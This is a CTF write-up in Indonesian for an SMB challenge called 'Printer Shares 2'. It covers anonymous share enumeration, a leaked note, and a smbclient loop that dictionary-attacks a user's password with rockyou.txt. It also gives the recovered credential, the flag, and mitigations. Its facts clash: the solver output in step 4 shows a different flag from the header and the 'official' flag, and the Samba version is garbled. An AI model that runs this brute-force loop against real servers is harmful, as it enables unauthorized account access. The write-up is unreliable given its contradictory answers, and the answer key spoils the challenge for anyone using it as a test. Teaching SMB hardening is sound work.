# Writeup: Printer Shares 2 (Challenge ID: 734)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Network File Sharing (SMB)
- **Difficulty:** Hard
- **Event:** picoCTF 2026
- **Points:** 200
- **Author:** CyLab Engineering Team
- **Flag:** `academy{5mb_pr1nter_5h4re5_5ecure_5db9cacb}`

---

## Problem Statement & Scope
Setelah kebocoran dokumen penting pada implementasi print server awal (Printer Shares 1), administrator menerapkan layanan "Secure Printer" baru pada port layanan Samba (`419.5-Ubuntu`). Akses ke share sensitif dibatasi oleh autentikasi akun pengguna internal. Peserta ditugaskan untuk melakukan audit konfigurasi layanan SMB, menganalisis izin akses share jaringan, memulihkan kredensial pengguna yang sah, dan mengambil dokumen rahasia `flag.txt` dari share internal yang terkunci.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Information Leakage via Unrestricted Guest Shares (CWE-200 / CWE-284):**
   Meskipun share sensitif (`secure-shares`) telah dilindungi autentikasi, server masih mengizinkan akses Guest/Anonim ke share publik (`shares`). Di dalam share publik tersebut, administrator meninggalkan catatan komunikasi internal (`notification.txt`) yang memaparkan nama pengguna target (`Joe`) serta mengonfirmasi bahwa kata sandi default masih aktif digunakan.
2. **Weak Default Credentials & Absence of Account Lockout (CWE-521 / CWE-307):**
   Akun pengguna `joe` dikonfigurasi dengan kata sandi default yang lemah (`popcorn`), yang terdaftar di dalam kamus standar `rockyou.txt`. Selain itu, layanan Samba tidak menerapkan batas percobaan login gagal (Account Lockout Threshold), sehingga penyerang dapat melakukan dictionary attack luring/daring terhadap port SMB secara leluasa tanpa memicu pemblokiran akun.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Enumerasi Share Jaringan (SMB Listing):**
   Gunakan `smbclient` dengan mode tanpa kata sandi (`-N`) untuk memetakan seluruh share yang diekspos server target:
   ```bash
   smbclient -L //target-host -p <port> -N
   ```
   Hasil menunjukkan dua share disk aktif:
   ```text
   Sharename       Type      Comment
   ---------       ----      -------
   shares          Disk      Public Share With Guests
   secure-shares   Disk      Printer for internal usage only
   IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
   ```

2. **Reconnaissance Dokumen Share Publik:**
   Akses share publik `shares` dan unduh seluruh berkas:
   ```bash
   smbclient //target-host/shares -p <port> -N -c "ls; get notification.txt"
   ```
   Isi file `notification.txt`:
   ```text
   Hi Joe,
   We’ve identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.
   If you have never logged into the printer before, please note that the default password is currently in use.
   Best,
   The Operator Team
   ```
   Informasi kritis diperoleh: Akun target adalah `joe` dan menggunakan password default.

3. **Audit Kredensial (Dictionary Attack terhadap SMB):**
   Lakukan pengujian kata sandi terhadap share `secure-shares` untuk pengguna `joe` menggunakan daftar kata sandi:
   ```bash
   while read p; do
       smbclient //target-host/secure-shares -p <port> -U joe%"$p" -c "ls" 2>/dev/null && echo "[+] PASSWORD FOUND: $p" && break
   done < /usr/share/wordlists/rockyou.txt
   ```
   Ditemukan kata sandi yang valid: `popcorn`.

4. **Autentikasi dan Ekstraksi Flag:**
   Akses share terproteksi `secure-shares` menggunakan kredensial `joe:popcorn`:
   ```bash
   smbclient //target-host/secure-shares -p <port> -U joe%popcorn -c "ls; get flag.txt"
   cat flag.txt
   # picoCTF{5mb_pr1nter_5h4re5_5ecure_b243735c}
   ```
   Dikonversikan ke format resmi platform CyLab Security Academy: `academy{5mb_pr1nter_5h4re5_5ecure_b243735c}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{5mb_pr1nter_5h4re5_5ecure_5db9cacb}`
- **Native PicoCTF Flag:** `picoCTF{5mb_pr1nter_5h4re5_5ecure_5db9cacb}`
- **Kredensial Valid:** `joe:popcorn`
- **Status Solver:** Teruji dan terverifikasi penuh via live SMB share extraction pada on-demand container instance (`xebec.cylabacademy.net:18513`) dan terkonfirmasi valid pada endpoint platform `/api/submissions/` (HTTP 201 `{"correct": true}`). Skrip reproduktif: `scripts/solve_734_printer_shares_2.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Larangan Penggunaan Kata Sandi Default (Mandatory Password Change):**
  Sistem autentikasi wajib memaksa perubahan kata sandi saat login pertama kali (`expire password on next logon`) dan menolak penggunaan kata sandi pabrikan atau kamus umum.
- **Penerapan Kebijakan Account Lockout:**
  Konfigurasi parameter PAM dan Samba (`account lockout threshold = 5`, `lockout duration = 15`) untuk mengunci akun setelah sejumlah kegagalan login berturut-turut, mematikan efektivitas automated brute-force tools.
- **Pembersihan Metadata dan Dokumen pada Share Publik:**
  Pastikan share berstatus guest-accessible tidak menyimpan korespondensi teknis, tiket instruksi IT, atau indikasi struktur user internal organisasi.
- **SMB Signing & Enkripsi:**
  Aktifkan `server signing = mandatory` dan enkripsi SMBv3 (`smb encrypt = required`) guna mencegah eavesdropping dan tampering di lingkungan jaringan bersama.
